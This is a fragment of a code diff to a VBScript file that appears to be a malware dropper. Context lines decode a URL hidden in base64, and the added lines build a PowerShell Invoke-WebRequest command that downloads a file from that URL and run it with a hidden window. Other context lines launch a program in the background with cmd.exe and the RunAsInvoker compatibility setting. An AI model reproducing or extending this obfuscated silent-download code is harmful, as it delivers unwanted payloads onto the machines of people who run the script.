@@ -80,7 +80,8 @@ base64Decoder.text = decodedText3
 decodedBytes4 = base64Decoder.nodeTypedValue
 url = BytesToStr(decodedBytes4)
 
-
+psCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & output & "'"""
+objShell.Run psCommand, 0, True
 
 Function BytesToStr(bytes)
     Dim stream
@@ -119,3 +120,4 @@ WshShell.Run "cmd.exe /c set __COMPAT_LAYER=RunAsInvoker && start """" /B ""C:\P
 
 
 WshShell.Run "cmd.exe /c timeout 1 /nobreak > nul", 0, True
+
